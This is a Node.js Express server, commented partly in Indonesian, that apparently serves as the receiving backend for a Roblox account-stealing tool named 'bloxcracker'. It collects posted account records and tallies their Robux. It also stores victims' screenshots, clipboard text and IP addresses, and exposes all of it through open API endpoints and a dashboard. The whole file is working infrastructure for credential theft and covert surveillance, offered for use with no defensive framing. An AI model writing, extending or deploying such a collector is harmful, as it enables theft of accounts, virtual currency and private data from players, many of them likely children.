const express = require('express');
const cors = require('cors');
const fs = require('fs');
const path = require('path');
const multer = require('multer');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(cors());
app.use(express.json({ limit: '100mb' }));
app.use(express.static('public'));

// Setup multer untuk upload screenshot
const storage = multer.diskStorage({
    destination: (req, file, cb) => {
        const dir = path.join(__dirname, 'public', 'screenshots');
        if (!fs.existsSync(dir)) {
            fs.mkdirSync(dir, { recursive: true });
        }
        cb(null, dir);
    },
    filename: (req, file, cb) => {
        cb(null, `screenshot_${Date.now()}.jpg`);
    }
});
const upload = multer({ storage });

// ============================================
// DATABASE FILE - support Railway Volume
// Set env DATA_PATH=/data/accounts.json di Railway
// ============================================
const DATA_FILE = process.env.DATA_PATH || path.join(__dirname, 'accounts.json');

// Pastikan folder data ada (untuk Railway Volume)
const dataDir = path.dirname(DATA_FILE);
if (!fs.existsSync(dataDir)) {
    fs.mkdirSync(dataDir, { recursive: true });
}

// Inisialisasi database
if (!fs.existsSync(DATA_FILE)) {
    fs.writeFileSync(DATA_FILE, JSON.stringify({
        accounts: [],
        logs: [],
        stats: {
            totalAccounts: 0,
            totalRobux: 0,
            lastUpdate: null
        }
    }, null, 2));
    console.log(`📁 Database created at: ${DATA_FILE}`);
}

// Helper functions
function readData() {
    try {
        const raw = fs.readFileSync(DATA_FILE, 'utf8');
        // Jaga-jaga kalau file kosong / corrupt
        if (!raw || raw.trim() === '' || raw.trim() === '[]' || raw.trim() === '{}') {
            return { accounts: [], logs: [], stats: { totalAccounts: 0, totalRobux: 0, lastUpdate: null } };
        }
        const parsed = JSON.parse(raw);
        // Pastikan struktur benar
        if (!parsed.accounts) parsed.accounts = [];
        if (!parsed.logs) parsed.logs = [];
        if (!parsed.stats) parsed.stats = { totalAccounts: 0, totalRobux: 0, lastUpdate: null };
        return parsed;
    } catch (error) {
        console.error('❌ readData error:', error.message);
        return { accounts: [], logs: [], stats: { totalAccounts: 0, totalRobux: 0, lastUpdate: null } };
    }
}

function writeData(data) {
    try {
        fs.writeFileSync(DATA_FILE, JSON.stringify(data, null, 2));
    } catch (error) {
        console.error('❌ writeData error:', error.message);
    }
}

// ============================================
// ROOT ROUTE - TEST
// ============================================

app.get('/', (req, res) => {
    const data = readData();
    res.json({
        status: '✅ Server is running!',
        version: '1.0.1',
        dataFile: DATA_FILE,
        endpoints: {
            'GET /api/accounts': 'Get all accounts',
            'POST /api/account': 'Save account data',
            'GET /api/account/:id': 'Get single account',
            'DELETE /api/account/:id': 'Delete account',
            'GET /api/stats': 'Get statistics',
            'POST /api/screenshot': 'Upload screenshot',
            'POST /api/clipboard': 'Save clipboard data'
        },
        totalAccounts: data.accounts.length
    });
});

// ============================================
// RECEIVE ACCOUNT DATA
// ============================================

app.post('/api/account', async (req, res) => {
    try {
        console.log('📥 Received account data');
        const accountData = req.body;

        // Kalau tidak ada userId, simpan ke logs saja (bukan accounts)
        // Ini mencegah data screenshot/clipboard/ip masuk ke tabel accounts
        if (!accountData.userId) {
            const data = readData();
            data.logs.push({
                type: accountData.type || 'unknown',
                receivedAt: new Date().toISOString(),
                ip: req.ip,
                payload: JSON.stringify(accountData).substring(0, 500)
            });
            // Batasi log maksimal 500 entri
            if (data.logs.length > 500) data.logs = data.logs.slice(-500);
            writeData(data);
            console.log('📝 Logged (no userId):', accountData.type);
            return res.json({ success: true, message: 'Logged (no userId)' });
        }

        const data = readData();

        // Tambah metadata
        accountData.receivedAt = new Date().toISOString();
        accountData.id = String(accountData.userId);
        accountData.ip = req.ip || req.connection.remoteAddress;

        // Cek duplikat berdasarkan userId
        const existingIndex = data.accounts.findIndex(
            acc => String(acc.userId) === String(accountData.userId)
        );

        if (existingIndex !== -1) {
            // Update account yang sudah ada
            data.accounts[existingIndex] = {
                ...data.accounts[existingIndex],
                ...accountData,
                updatedAt: new Date().toISOString()
            };
            console.log(`🔄 Account updated: ${accountData.username} (${accountData.userId})`);
        } else {
            // Tambah account baru
            data.accounts.push({
                ...accountData,
                createdAt: new Date().toISOString()
            });
            data.stats.totalAccounts = data.accounts.length;
            console.log(`✅ Account added: ${accountData.username} (${accountData.userId})`);
        }

        // Update stats
        data.stats.totalRobux = data.accounts.reduce((sum, acc) => sum + (Number(acc.robux) || 0), 0);
        data.stats.lastUpdate = new Date().toISOString();

        // Log ringkas
        data.logs.push({
            type: 'account_received',
            userId: accountData.userId,
            username: accountData.username,
            timestamp: new Date().toISOString(),
            ip: req.ip
        });

        // Batasi log maksimal 500 entri
        if (data.logs.length > 500) data.logs = data.logs.slice(-500);

        writeData(data);

        res.json({
            success: true,
            message: existingIndex !== -1 ? 'Account updated' : 'Account saved',
            accountId: accountData.id
        });

    } catch (error) {
        console.error('❌ Error saving account:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

// ============================================
// RECEIVE SCREENSHOT
// ============================================

app.post('/api/screenshot', upload.single('screenshot'), async (req, res) => {
    try {
        const { metadata } = req.body;
        const data = readData();

        let screenshotUrl = null;
        if (req.file) {
            screenshotUrl = `/screenshots/${req.file.filename}`;
            data.logs.push({
                type: 'screenshot',
                url: screenshotUrl,
                metadata: metadata ? JSON.parse(metadata) : {},
                timestamp: new Date().toISOString()
            });
            if (data.logs.length > 500) data.logs = data.logs.slice(-500);
            writeData(data);
        }

        res.json({ success: true, url: screenshotUrl });

    } catch (error) {
        console.error('❌ Error saving screenshot:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

// ============================================
// RECEIVE CLIPBOARD
// ============================================

app.post('/api/clipboard', async (req, res) => {
    try {
        const clipboardData = req.body;
        const data = readData();

        data.logs.push({
            type: 'clipboard',
            content: clipboardData.text?.substring(0, 500) || '',
            hasData: clipboardData.hasData,
            timestamp: new Date().toISOString()
        });

        if (data.logs.length > 500) data.logs = data.logs.slice(-500);
        writeData(data);
        res.json({ success: true });

    } catch (error) {
        console.error('❌ Error saving clipboard:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

// ============================================
// GET ALL ACCOUNTS
// ============================================

app.get('/api/accounts', (req, res) => {
    try {
        const data = readData();
        res.json({
            success: true,
            accounts: data.accounts,
            stats: data.stats,
            total: data.accounts.length
        });
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

// ============================================
// GET SINGLE ACCOUNT
// ============================================

app.get('/api/account/:id', (req, res) => {
    try {
        const data = readData();
        const account = data.accounts.find(a => String(a.userId) === String(req.params.id));

        if (account) {
            res.json({ success: true, account });
        } else {
            res.status(404).json({ success: false, error: 'Account not found' });
        }
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

// ============================================
// DELETE ACCOUNT
// ============================================

app.delete('/api/account/:id', (req, res) => {
    try {
        const data = readData();
        data.accounts = data.accounts.filter(a => String(a.userId) !== String(req.params.id));
        data.stats.totalAccounts = data.accounts.length;
        data.stats.totalRobux = data.accounts.reduce((sum, acc) => sum + (Number(acc.robux) || 0), 0);

        data.logs.push({
            type: 'account_deleted',
            userId: req.params.id,
            timestamp: new Date().toISOString()
        });

        if (data.logs.length > 500) data.logs = data.logs.slice(-500);
        writeData(data);
        res.json({ success: true });
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

// ============================================
// GET STATS
// ============================================

app.get('/api/stats', (req, res) => {
    try {
        const data = readData();
        res.json({
            success: true,
            stats: data.stats,
            recentLogs: data.logs.slice(-20)
        });
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

// ============================================
// DASHBOARD HTML
// ============================================

app.get('/dashboard', (req, res) => {
    const htmlPath = path.join(__dirname, 'public', 'dashboard.html');
    if (fs.existsSync(htmlPath)) {
        res.sendFile(htmlPath);
    } else {
        res.json({ message: 'Dashboard HTML not found, create public/dashboard.html' });
    }
});

// ============================================
// START SERVER
// ============================================

app.listen(PORT, '0.0.0.0', () => {
    console.log(`🚀 Server running on port ${PORT}`);
    console.log(`📁 Data file: ${DATA_FILE}`);
    console.log(`📊 Dashboard: https://bloxcracker.up.railway.app/`);
    console.log(`📊 Accounts: https://bloxcracker.up.railway.app/api/accounts`);
});
